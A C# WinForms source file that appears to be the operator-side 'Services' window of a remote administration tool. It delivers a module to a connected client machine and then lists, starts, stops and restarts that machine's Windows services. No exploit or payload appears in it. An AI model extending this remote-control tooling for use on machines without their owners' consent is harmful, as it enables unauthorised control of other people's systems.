using System.Text.Json;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;

namespace mullvad.Forms;

public sealed class ServicesManagerForm : Form
{
    private const string ModuleFile = "mullvad.Module.Services";
    private const string ModuleId   = "mullvad.services";

    private readonly ClientHandler _handler;
    private ModuleContext?         _ctx;

    // ── Controls ─────────────────────────────────────────────────────────────
    private ToolStrip             toolbar        = null!;
    private ToolStripButton       btnRefresh     = null!;
    private ToolStripButton       btnStart       = null!;
    private ToolStripButton       btnStop        = null!;
    private ToolStripButton       btnRestart     = null!;
    private ToolStripButton       btnDetails     = null!;
    private ToolStripTextBox      txtSearch      = null!;
    private SplitContainer        split          = null!;
    private ListView              lvServices     = null!;
    private TabControl            tabs           = null!;
    private ListView              lvProps        = null!;
    private ListView              lvDeps         = null!;
    private StatusStrip           statusStrip    = null!;
    private ToolStripStatusLabel  statusLabel    = null!;
    private ToolStripProgressBar  statusProgress = null!;
    private Panel                 loadingPanel   = null!;
    private Label                 loadingLabel   = null!;

    private ImageList? _svcIcons;

    // ── Service data ──────────────────────────────────────────────────────────
    private sealed class ServiceRow
    {
        public string Name        = "";
        public string DisplayName = "";
        public string Description = "";
        public string Status      = "";
        public string StartType   = "";
        public string LogOnAs     = "";
        public string ImagePath   = "";
        public int    Pid;
    }

    private List<ServiceRow> _rows    = new();
    private List<ServiceRow> _visible = new();

    private static readonly Dictionary<ClientHandler, ServicesManagerForm> _openForms = new();

    public static ServicesManagerForm CreateOrActivate(ClientHandler handler)
    {
        if (_openForms.TryGetValue(handler, out var existing) && !existing.IsDisposed)
        {
            existing.BringToFront();
            return existing;
        }
        var frm = new ServicesManagerForm(handler);
        frm.FormClosed += (_, _) => _openForms.Remove(handler);
        _openForms[handler] = frm;
        return frm;
    }

    private ServicesManagerForm(ClientHandler handler)
    {
        _handler = handler;
        Build();
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Construction
    // ─────────────────────────────────────────────────────────────────────────
    private void Build()
    {
        SuspendLayout();

        Text          = $"Services  —  {_handler.Info.Computer}";
        ClientSize    = new Size(1000, 620);
        Font          = new Font("Segoe UI", 9F);
        MinimumSize   = new Size(700, 440);
        StartPosition = FormStartPosition.CenterParent;
        ShowInTaskbar = true;

        // Official Windows Services icon (services.msc, falls back to cog)
        try
        {
            string mscPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.System), "services.msc");
            if (File.Exists(mscPath))
                Icon = Icon.ExtractAssociatedIcon(mscPath) ?? SystemIcons.Application;
            else
                Icon = SystemIcons.Application;
        }
        catch
        {
            var fallback = IconLoader.Load("cog.png") as Bitmap;
            if (fallback is not null) try { Icon = Icon.FromHandle(fallback.GetHicon()); } catch { }
        }

        // ── Toolbar ───────────────────────────────────────────────────────────
        toolbar = new ToolStrip { GripStyle = ToolStripGripStyle.Hidden, Dock = DockStyle.Top };

        btnRefresh = MakeBtn("⟳", "Refresh", "refresh.png");
        btnRefresh.Click += (_, _) => _ = RefreshAsync();

        btnStart = MakeBtn("▶", "Start service", "done.png");
        btnStart.Enabled = false;
        btnStart.Click  += (_, _) => _ = ControlSelectedAsync("start");

        btnStop = MakeBtn("■", "Stop service", "cancel.png");
        btnStop.Enabled = false;
        btnStop.Click  += (_, _) => _ = ControlSelectedAsync("stop");

        btnRestart = MakeBtn("↺", "Restart service", "refresh.png");
        btnRestart.Enabled = false;
        btnRestart.Click  += (_, _) => _ = ControlSelectedAsync("restart");

        btnDetails = MakeBtn("ℹ", "View details", "information.png");
        btnDetails.Enabled = false;
        btnDetails.Click  += (_, _) => _ = LoadDetailsAsync(SelectedRow());

        txtSearch = new ToolStripTextBox { Width = 200, ToolTipText = "Filter services…" };
        ((TextBox)txtSearch.Control).PlaceholderText = "Search…";
        txtSearch.TextChanged += (_, _) => ApplyFilter();
        txtSearch.KeyDown += (_, e) =>
        {
            if (e.KeyCode is Keys.Down or Keys.Enter)
            {
                lvServices.Focus();
                if (lvServices.Items.Count > 0 && lvServices.SelectedItems.Count == 0)
                    lvServices.Items[0].Selected = true;
                e.Handled = true;
            }
            else if (e.KeyCode == Keys.Escape)
            {
                txtSearch.Text = "";
                e.Handled = true;
            }
        };

        toolbar.Items.AddRange(new ToolStripItem[]
        {
            btnRefresh,
            new ToolStripSeparator(),
            btnStart, btnStop, btnRestart,
            new ToolStripSeparator(),
            btnDetails,
            new ToolStripSeparator(),
            new ToolStripLabel("Search: "),
            txtSearch,
        });

        // ── Services ListView ─────────────────────────────────────────────────
        lvServices = new ListView
        {
            View             = View.Details,
            FullRowSelect    = true,
            GridLines        = false,
            MultiSelect      = false,
            HideSelection    = false,
            UseCompatibleStateImageBehavior = false,
            Dock             = DockStyle.Fill,
        };
        lvServices.Columns.Add("Display Name",  220);
        lvServices.Columns.Add("Status",         80, HorizontalAlignment.Center);
        lvServices.Columns.Add("Startup Type",  130);
        lvServices.Columns.Add("Log On As",     130);
        lvServices.Columns.Add("Name",          120);
        lvServices.Columns.Add("Description",   300);

        lvServices.ColumnClick          += LvServices_ColumnClick;
        lvServices.SelectedIndexChanged += LvServices_SelectionChanged;
        lvServices.DoubleClick          += (_, _) => _ = LoadDetailsAsync(SelectedRow());

        // Context menu
        var ctx          = new ContextMenuStrip();
        var miStart      = new ToolStripMenuItem("Start");
        var miStop       = new ToolStripMenuItem("Stop");
        var miRestart    = new ToolStripMenuItem("Restart");
        var miCtxDetails = new ToolStripMenuItem("Properties");
        var miCtxRefresh = new ToolStripMenuItem("Refresh");
        IconLoader.SetIcon(miStart,      "done.png");
        IconLoader.SetIcon(miStop,       "cancel.png");
        IconLoader.SetIcon(miRestart,    "refresh.png");
        IconLoader.SetIcon(miCtxDetails, "information.png");
        IconLoader.SetIcon(miCtxRefresh, "refresh.png");
        miStart.Click      += (_, _) => _ = ControlSelectedAsync("start");
        miStop.Click       += (_, _) => _ = ControlSelectedAsync("stop");
        miRestart.Click    += (_, _) => _ = ControlSelectedAsync("restart");
        miCtxDetails.Click += (_, _) => _ = LoadDetailsAsync(SelectedRow());
        miCtxRefresh.Click += (_, _) => _ = RefreshAsync();
        ctx.Items.AddRange(new ToolStripItem[]
        {
            miStart, miStop, miRestart,
            new ToolStripSeparator(),
            miCtxDetails,
            new ToolStripSeparator(),
            miCtxRefresh,
        });
        ctx.Opening += (_, _) =>
        {
            var row = SelectedRow();
            bool has = row is not null;
            bool running = row?.Status == "Running";
            bool stopped = row?.Status == "Stopped";
            miStart.Enabled      = has && !running;
            miStop.Enabled       = has && running;
            miRestart.Enabled    = has;
            miCtxDetails.Enabled = has;
        };
        lvServices.ContextMenuStrip = ctx;

        // ── Detail tabs ───────────────────────────────────────────────────────
        tabs = new TabControl { Dock = DockStyle.Fill };

        lvProps = new ListView
        {
            View          = View.Details,
            FullRowSelect = true,
            GridLines     = false,
            HeaderStyle   = ColumnHeaderStyle.Nonclickable,
            Dock          = DockStyle.Fill,
        };
        lvProps.Columns.Add("Property", 180);
        lvProps.Columns.Add("Value",    500);
        var tabProps = new TabPage("Properties") { Padding = new Padding(0) };
        tabProps.Controls.Add(lvProps);
        tabs.TabPages.Add(tabProps);

        lvDeps = new ListView
        {
            View          = View.Details,
            FullRowSelect = true,
            GridLines     = false,
            Dock          = DockStyle.Fill,
        };
        lvDeps.Columns.Add("Service",    260);
        lvDeps.Columns.Add("Relationship", 120);
        var tabDeps = new TabPage("Dependencies") { Padding = new Padding(0) };
        tabDeps.Controls.Add(lvDeps);
        tabs.TabPages.Add(tabDeps);

        // ── Split ─────────────────────────────────────────────────────────────
        split = new SplitContainer
        {
            Dock             = DockStyle.Fill,
            Orientation      = Orientation.Horizontal,
            SplitterDistance = 360,
        };
        split.Panel1.Controls.Add(lvServices);
        split.Panel2.Controls.Add(tabs);

        // ── Status bar ────────────────────────────────────────────────────────
        statusStrip    = new StatusStrip();
        statusLabel    = new ToolStripStatusLabel { Spring = true, TextAlign = ContentAlignment.MiddleLeft };
        statusProgress = new ToolStripProgressBar { Visible = false, Width = 120 };
        statusStrip.Items.AddRange(new ToolStripItem[] { statusLabel, statusProgress });

        // ── Loading overlay ───────────────────────────────────────────────────
        loadingPanel = new Panel
        {
            Dock      = DockStyle.Fill,
            BackColor = Color.FromArgb(200, SystemColors.Control),
            Visible   = true,
        };
        loadingLabel = new Label
        {
            Text      = "Delivering module to client…",
            AutoSize  = false,
            TextAlign = ContentAlignment.MiddleCenter,
            Dock      = DockStyle.Fill,
            Font      = new Font("Segoe UI", 10F),
        };
        loadingPanel.Controls.Add(loadingLabel);

        Controls.Add(loadingPanel);
        Controls.Add(split);
        Controls.Add(toolbar);
        Controls.Add(statusStrip);
        loadingPanel.BringToFront();

        ResumeLayout(false);
        PerformLayout();

        Load       += OnLoad;
        FormClosed += OnFormClosed;
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Load
    // ─────────────────────────────────────────────────────────────────────────
    private async void OnLoad(object? sender, EventArgs e)
    {
        SetToolbarEnabled(false);
        _handler.Disconnected += OnClientDisconnected;

        var progress = new Progress<string>(msg =>
        {
            loadingLabel.Text = msg;
            statusLabel.Text  = msg;
        });

        var bytes = ModuleLoader.GetModuleBytes(ModuleFile);
        if (bytes == null)
        {
            loadingLabel.Text = "Module file not found.\nBuild the Services project first.";
            statusLabel.Text  = "Module not found.";
            return;
        }

        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(60));
        bool ok = await ModuleDelivery.EnsureDeliveredAsync(_handler, ModuleFile, bytes, progress, cts.Token);

        if (!ok)
        {
            loadingLabel.Text = "Failed to load module on client.";
            statusLabel.Text  = "Module delivery failed.";
            return;
        }

        _ctx = new ModuleContext(_handler, ModuleId);
        _ctx.Disconnected += (_, _) => BeginInvoke(() => OnClientDisconnected(_handler));

        loadingPanel.Visible = false;
        SetToolbarEnabled(true);

        await RefreshAsync();
    }

    private void OnFormClosed(object? sender, FormClosedEventArgs e)
    {
        _handler.Disconnected -= OnClientDisconnected;
        _ctx?.Dispose();
        _svcIcons?.Dispose();
    }

    private void OnClientDisconnected(ClientHandler _)
    {
        if (IsDisposed) return;
        BeginInvoke(() =>
        {
            SetToolbarEnabled(false);
            statusLabel.Text     = "Disconnected.";
            loadingLabel.Text    = "Client disconnected.";
            loadingPanel.Visible = true;
        });
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Refresh
    // ─────────────────────────────────────────────────────────────────────────
    private async Task RefreshAsync()
    {
        if (_ctx == null) return;
        SetBusy(true);
        statusLabel.Text = "Loading services…";
        try
        {
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(90));
            var json = await _ctx.ExecuteAsync("list", "", cts.Token);
            ParseServiceList(json);
        }
        catch (OperationCanceledException) { statusLabel.Text = "Timed out."; }
        catch (Exception ex)               { statusLabel.Text = $"Error: {ex.Message}"; }
        finally { SetBusy(false); }
    }

    private void ParseServiceList(string json)
    {
        var newRows  = new List<ServiceRow>();
        var newIcons = new ImageList { ImageSize = new Size(16, 16), ColorDepth = ColorDepth.Depth32Bit };

        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;

            if (root.TryGetProperty("error", out var errEl))
            {
                statusLabel.Text = $"Error: {errEl.GetString()}";
                newIcons.Dispose();
                return;
            }

            // Decode icon dict
            if (root.TryGetProperty("icons", out var iconsEl) && iconsEl.ValueKind == JsonValueKind.Object)
            {
                foreach (var kv in iconsEl.EnumerateObject())
                {
                    string b64 = kv.Value.GetString() ?? "";
                    if (string.IsNullOrEmpty(b64)) continue;
                    try
                    {
                        var imgBytes = Convert.FromBase64String(b64);
                        using var ms  = new MemoryStream(imgBytes);
                        using var tmp = Image.FromStream(ms);
                        newIcons.Images.Add(kv.Name, new Bitmap(tmp));
                    }
                    catch { }
                }
            }

            // Parse service array
            if (root.TryGetProperty("services", out var svcArr) && svcArr.ValueKind == JsonValueKind.Array)
            {
                foreach (var el in svcArr.EnumerateArray())
                {
                    newRows.Add(new ServiceRow
                    {
                        Name        = Str(el, "name"),
                        DisplayName = Str(el, "display_name"),
                        Description = Str(el, "description"),
                        Status      = Str(el, "status"),
                        StartType   = Str(el, "start_type"),
                        LogOnAs     = Str(el, "log_on_as"),
                        ImagePath   = Str(el, "image_path"),
                        Pid         = Int(el, "pid"),
                    });
                }
            }
        }
        catch (Exception ex)
        {
            statusLabel.Text = $"Parse error: {ex.Message}";
            newIcons.Dispose();
            return;
        }

        // Add default icon fallback
        try { newIcons.Images.Add("__svc__", new Bitmap(SystemIcons.Application.ToBitmap(), new Size(16, 16))); }
        catch { }

        lvServices.SmallImageList = null;
        var oldIcons  = _svcIcons;
        _svcIcons     = newIcons;
        lvServices.SmallImageList = _svcIcons;
        oldIcons?.Dispose();

        _rows = newRows;
        ApplyFilter();

        int running  = newRows.Count(r => r.Status == "Running");
        int stopped  = newRows.Count(r => r.Status == "Stopped");
        statusLabel.Text = $"{newRows.Count} services  ({running} running, {stopped} stopped)  —  {DateTime.Now:HH:mm:ss}";
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Filter + rebuild view
    // ─────────────────────────────────────────────────────────────────────────
    private void ApplyFilter()
    {
        string q = txtSearch.Text.Trim();

        _visible = string.IsNullOrEmpty(q)
            ? new List<ServiceRow>(_rows)
            : _rows.Where(r =>
                r.DisplayName.Contains(q, StringComparison.OrdinalIgnoreCase) ||
                r.Name.Contains(q, StringComparison.OrdinalIgnoreCase) ||
                r.Description.Contains(q, StringComparison.OrdinalIgnoreCase) ||
                r.Status.Contains(q, StringComparison.OrdinalIgnoreCase)).ToList();

        lvServices.BeginUpdate();
        lvServices.Items.Clear();

        foreach (var row in _visible)
        {
            var lvi = new ListViewItem(row.DisplayName) { Tag = row };

            // Icon key: use image path if available
            if (!string.IsNullOrEmpty(row.ImagePath) &&
                _svcIcons?.Images.ContainsKey(row.ImagePath) == true)
                lvi.ImageKey = row.ImagePath;
            else
                lvi.ImageKey = "__svc__";

            // Status color coding
            lvi.ForeColor = row.Status switch
            {
                "Running"      => Color.FromArgb(0, 160, 80),
                "Stopped"      => SystemColors.GrayText,
                "StartPending" or "StopPending" or
                "ContinuePending" or "PausePending" => Color.DarkOrange,
                "Paused"       => Color.DodgerBlue,
                _              => lvServices.ForeColor,
            };

            lvi.SubItems.Add(row.Status);
            lvi.SubItems.Add(row.StartType);
            lvi.SubItems.Add(row.LogOnAs);
            lvi.SubItems.Add(row.Name);
            lvi.SubItems.Add(row.Description);

            lvServices.Items.Add(lvi);
        }

        lvServices.EndUpdate();
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Start / Stop / Restart
    // ─────────────────────────────────────────────────────────────────────────
    private async Task ControlSelectedAsync(string op)
    {
        if (_ctx == null) return;
        var row = SelectedRow();
        if (row == null) return;

        string verb = op switch { "start" => "Starting", "stop" => "Stopping", _ => "Restarting" };
        SetBusy(true);
        statusLabel.Text = $"{verb} \"{row.DisplayName}\"…";
        SetToolbarEnabled(false);
        try
        {
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(60));
            var json = await _ctx.ExecuteAsync(op, $"{{\"name\":{JsonName(row.Name)}}}", cts.Token);

            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;

            if (root.TryGetProperty("error", out var err))
                statusLabel.Text = $"Error: {err.GetString()}";
            else
            {
                string newStatus = root.TryGetProperty("status", out var st) ? st.GetString() ?? "" : "";
                string note      = root.TryGetProperty("note",   out var nt) ? nt.GetString() ?? "" : "";
                statusLabel.Text = string.IsNullOrEmpty(note)
                    ? $"\"{row.DisplayName}\" → {newStatus}"
                    : $"\"{row.DisplayName}\" — {note}";
            }
        }
        catch (OperationCanceledException) { statusLabel.Text = "Operation timed out."; }
        catch (Exception ex)               { statusLabel.Text = $"Error: {ex.Message}"; }
        finally { SetBusy(false); SetToolbarEnabled(true); }

        await RefreshAsync();
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Details
    // ─────────────────────────────────────────────────────────────────────────
    private async Task LoadDetailsAsync(ServiceRow? row)
    {
        if (_ctx == null || row == null) return;
        SetBusy(true);
        statusLabel.Text = $"Loading details for \"{row.DisplayName}\"…";
        try
        {
            using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(30));
            var json = await _ctx.ExecuteAsync("details", $"{{\"name\":{JsonName(row.Name)}}}", cts.Token);
            ParseDetails(json, row.DisplayName);
        }
        catch (OperationCanceledException) { statusLabel.Text = "Timed out."; }
        catch (Exception ex)               { statusLabel.Text = $"Error: {ex.Message}"; }
        finally { SetBusy(false); }
    }

    private void ParseDetails(string json, string displayName)
    {
        lvProps.BeginUpdate();
        lvProps.Items.Clear();
        lvDeps.BeginUpdate();
        lvDeps.Items.Clear();

        try
        {
            using var doc = JsonDocument.Parse(json);
            var root = doc.RootElement;

            if (root.TryGetProperty("error", out var err))
            {
                statusLabel.Text = $"Error: {err.GetString()}";
                return;
            }

            void Add(string prop, string val)
            {
                var lvi = new ListViewItem(prop);
                lvi.SubItems.Add(val);
                lvProps.Items.Add(lvi);
            }

            Add("Service Name",  Str(root, "name"));
            Add("Display Name",  Str(root, "display_name"));
            Add("Description",   Str(root, "description"));
            Add("Status",        Str(root, "status"));
            Add("Startup Type",  Str(root, "start_type"));
            Add("Log On As",     Str(root, "log_on_as"));
            int pid = Int(root, "pid");
            Add("Process ID",    pid > 0 ? pid.ToString() : "—");
            Add("Executable",    Str(root, "image_path"));

            // Dependencies
            if (root.TryGetProperty("depends_on", out var depsOn) && depsOn.ValueKind == JsonValueKind.Array)
            {
                foreach (var dep in depsOn.EnumerateArray())
                {
                    var lvi = new ListViewItem(dep.GetString() ?? "");
                    lvi.SubItems.Add("Depends on");
                    lvDeps.Items.Add(lvi);
                }
            }

            // Dependents
            if (root.TryGetProperty("depended_on_by", out var depsBy) && depsBy.ValueKind == JsonValueKind.Array)
            {
                foreach (var dep in depsBy.EnumerateArray())
                {
                    var lvi = new ListViewItem(dep.GetString() ?? "");
                    lvi.SubItems.Add("Required by");
                    lvDeps.Items.Add(lvi);
                }
            }

            int depCount = lvDeps.Items.Count;
            statusLabel.Text = $"Properties: {displayName}  ({depCount} {(depCount == 1 ? "dependency" : "dependencies")})";

            // Switch to Properties tab
            if (tabs.SelectedIndex != 0)
                tabs.SelectedIndex = 0;
        }
        catch (Exception ex) { statusLabel.Text = $"Parse error: {ex.Message}"; }
        finally
        {
            lvProps.EndUpdate();
            lvDeps.EndUpdate();
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Column sort
    // ─────────────────────────────────────────────────────────────────────────
    private int  _sortCol = 0;
    private bool _sortAsc = true;

    private void LvServices_ColumnClick(object? sender, ColumnClickEventArgs e)
    {
        if (_sortCol == e.Column) _sortAsc = !_sortAsc;
        else { _sortCol = e.Column; _sortAsc = true; }
        lvServices.ListViewItemSorter = new ServiceSorter(_sortCol, _sortAsc);
        lvServices.Sort();
    }

    private void LvServices_SelectionChanged(object? sender, EventArgs e)
    {
        bool has = lvServices.SelectedItems.Count > 0;
        string status = has ? (lvServices.SelectedItems[0].Tag as ServiceRow)?.Status ?? "" : "";
        bool running  = status == "Running";
        bool stopped  = status == "Stopped";

        btnStart.Enabled   = has && !running;
        btnStop.Enabled    = has && running;
        btnRestart.Enabled = has;
        btnDetails.Enabled = has;

        if (has) _ = LoadDetailsAsync(SelectedRow());
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Helpers
    // ─────────────────────────────────────────────────────────────────────────
    private ServiceRow? SelectedRow()
        => lvServices.SelectedItems.Count > 0
            ? lvServices.SelectedItems[0].Tag as ServiceRow
            : null;

    private void SetToolbarEnabled(bool on)
    {
        btnRefresh.Enabled = on;
        if (!on)
        {
            btnStart.Enabled = btnStop.Enabled = btnRestart.Enabled = btnDetails.Enabled = false;
        }
        else
        {
            LvServices_SelectionChanged(null, EventArgs.Empty);
        }
    }

    private void SetBusy(bool busy)
    {
        statusProgress.Visible = busy;
        if (busy) statusProgress.Style = ProgressBarStyle.Marquee;
    }

    private static string JsonName(string s)
    {
        var sb = new System.Text.StringBuilder("\"");
        foreach (char c in s)
        {
            if (c == '\\') sb.Append("\\\\");
            else if (c == '"') sb.Append("\\\"");
            else sb.Append(c);
        }
        sb.Append('"');
        return sb.ToString();
    }

    private static ToolStripButton MakeBtn(string text, string tip, string? iconFile = null)
    {
        var btn = new ToolStripButton
        {
            ToolTipText  = tip,
            DisplayStyle = ToolStripItemDisplayStyle.Image,
            ImageScaling = ToolStripItemImageScaling.SizeToFit,
        };
        if (iconFile is not null)
        {
            var img = IconLoader.Load(iconFile);
            if (img is not null) { btn.Image = img; return btn; }
        }
        btn.Text         = text;
        btn.DisplayStyle = ToolStripItemDisplayStyle.Text;
        return btn;
    }

    private static string Str(JsonElement el, string key)
        => el.TryGetProperty(key, out var v) ? v.GetString() ?? "" : "";

    private static int Int(JsonElement el, string key)
    {
        if (!el.TryGetProperty(key, out var v)) return 0;
        if (v.ValueKind == JsonValueKind.Number && v.TryGetInt32(out int i)) return i;
        return 0;
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  Column sorter
    // ─────────────────────────────────────────────────────────────────────────
    private sealed class ServiceSorter : System.Collections.IComparer
    {
        private readonly int  _col;
        private readonly bool _asc;
        public ServiceSorter(int col, bool asc) { _col = col; _asc = asc; }

        public int Compare(object? x, object? y)
        {
            string a = (x as ListViewItem)?.SubItems[_col].Text ?? "";
            string b = (y as ListViewItem)?.SubItems[_col].Text ?? "";
            int cmp  = string.Compare(a, b, StringComparison.OrdinalIgnoreCase);
            return _asc ? cmp : -cmp;
        }
    }
}
